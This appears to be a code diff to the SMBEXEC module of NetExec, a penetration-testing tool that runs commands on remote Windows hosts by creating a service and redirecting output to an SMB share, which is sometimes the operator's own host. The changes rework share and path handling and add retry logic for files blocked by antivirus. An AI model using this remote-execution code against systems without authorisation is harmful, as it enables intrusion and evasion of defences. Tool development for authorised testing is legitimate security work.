@@ -3,13 +3,14 @@ from os.path import join as path_join
 from time import sleep
 from impacket.dcerpc.v5 import transport, scmr
 from nxc.helpers.misc import gen_random_string
+from nxc.paths import TMP_PATH
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE
 
 
 class SMBEXEC:
-    def __init__(self, host, share_name, smbconnection, protocol, username="", password="", domain="", doKerberos=False, aesKey=None, kdcHost=None, hashes=None, share=None, port=445, logger=None, tries=None):
+    def __init__(self, host, share_name, smbconnection, username="", password="", domain="", doKerberos=False, aesKey=None, remoteHost=None, kdcHost=None, hashes=None, share=None, port=445, logger=None, tries=None):
         self.__host = host
-        self.__share_name = "C$"
+        self.__share_name = share_name
         self.__port = port
         self.__username = username
         self.__password = password
@@ -26,9 +27,9 @@ class SMBEXEC:
         self.__retOutput = False
         self.__rpctransport = None
         self.__scmr = None
-        self.__conn = None
         self.__aesKey = aesKey
         self.__doKerberos = doKerberos
+        self.__remoteHost = remoteHost
         self.__kdcHost = kdcHost
         self.__tries = tries
         self.logger = logger
@@ -49,7 +50,8 @@ class SMBEXEC:
         self.__rpctransport.set_dport(self.__port)
 
         if hasattr(self.__rpctransport, "setRemoteHost"):
-            self.__rpctransport.setRemoteHost(self.__host)
+            self.__rpctransport.setRemoteHost(self.__remoteHost)
+
         if hasattr(self.__rpctransport, "set_credentials"):
             # This method exists only for selected protocol sequences.
             self.__rpctransport.set_credentials(
@@ -92,15 +94,13 @@ class SMBEXEC:
         self.__output = gen_random_string(6)
         self.__batchFile = gen_random_string(6) + ".bat"
 
-        command = self.__shell + "echo " + data + f" ^> \\\\127.0.0.1\\{self.__share_name}\\{self.__output} 2^>^&1 > %TEMP%\\{self.__batchFile} & %COMSPEC% /Q /c %TEMP%\\{self.__batchFile} & %COMSPEC% /Q /c del %TEMP%\\{self.__batchFile}" if self.__retOutput else self.__shell + data
+        command = self.__shell + "echo " + data + f" ^> \\\\%COMPUTERNAME%\\{self.__share}\\{self.__output} 2^>^&1 > %TEMP%\\{self.__batchFile} & %COMSPEC% /Q /c %TEMP%\\{self.__batchFile} & %COMSPEC% /Q /c del %TEMP%\\{self.__batchFile}" if self.__retOutput else self.__shell + data
 
-        with open(path_join("/tmp", "nxc_hosted", self.__batchFile), "w") as batch_file:
+        with open(path_join(TMP_PATH, self.__batchFile), "w") as batch_file:
             batch_file.write(command)
 
         self.logger.debug("Hosting batch file with command: " + command)
-
         self.logger.debug("Command to execute: " + command)
-
         self.logger.debug(f"Remote service {self.__serviceName} created.")
 
         try:
@@ -137,23 +137,35 @@ class SMBEXEC:
         if self.__retOutput is False:
             self.__outputBuffer = ""
             return
-        tries = 1
+
+        # TODO: It looks like the service is hanging anyway until the command is finished, so all this timeout logic is likely not needed
+        # Still adding this for now to keep the structure similar until we can confirm the above
+        tries = 0
         while True:
             try:
                 self.logger.info(f"Attempting to read {self.__share}\\{self.__output}")
                 self.__smbconnection.getFile(self.__share, self.__output, self.output_callback)
                 break
             except Exception as e:
-                if tries >= self.__tries:
+                if tries > self.__tries:
                     self.logger.fail("SMBEXEC: Could not retrieve output file, it may have been detected by AV. Please increase the number of tries with the option '--get-output-tries'. If it is still failing, try the 'wmi' protocol or another exec method")
                     break
-                if str(e).find("STATUS_BAD_NETWORK_NAME") > 0:
+                if "STATUS_BAD_NETWORK_NAME" in str(e):
                     self.logger.fail(f"SMBEXEC: Getting the output file failed - target has blocked access to the share: {self.__share} (but the command may have executed!)")
                     break
-                if str(e).find("STATUS_SHARING_VIOLATION") >= 0 or str(e).find("STATUS_OBJECT_NAME_NOT_FOUND") >= 0:
-                    # Output not finished, let's wait
-                    sleep(2)
+                elif "STATUS_VIRUS_INFECTED" in str(e):
+                    self.logger.fail("Command did not run because a virus was detected")
+                    break
+                # When executing powershell and the command is still running, we get a sharing violation
+                # We can use that information to wait longer than if the file is not found (probably av or something)
+                if "STATUS_SHARING_VIOLATION" in str(e):
+                    self.logger.info(f"File {self.__share}\\{self.__output} is still in use with {self.__tries - tries} left, retrying...")
                     tries += 1
+                    sleep(1)
+                elif "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
+                    self.logger.info(f"File {self.__share}\\{self.__output} not found with {self.__tries - tries} left, deducting 10 tries and retrying...")
+                    tries += 10
+                    sleep(1)
                 else:
                     self.logger.debug(str(e))
 
@@ -168,7 +180,7 @@ class SMBEXEC:
 
         command = self.__shell + data + f" ^> \\\\{local_ip}\\{self.__share_name}\\{self.__output}" if self.__retOutput else self.__shell + data
 
-        with open(path_join("/tmp", "nxc_hosted", self.__batchFile), "w") as batch_file:
+        with open(path_join(TMP_PATH, self.__batchFile), "w") as batch_file:
             batch_file.write(command)
 
         self.logger.debug("Hosting batch file with command: " + command)
@@ -203,7 +215,7 @@ class SMBEXEC:
 
         while True:
             try:
-                with open(path_join("/tmp", "nxc_hosted", self.__output), "rb") as output:
+                with open(path_join(TMP_PATH, self.__output), "rb") as output:
                     self.output_callback(output.read())
                 break
             except OSError:
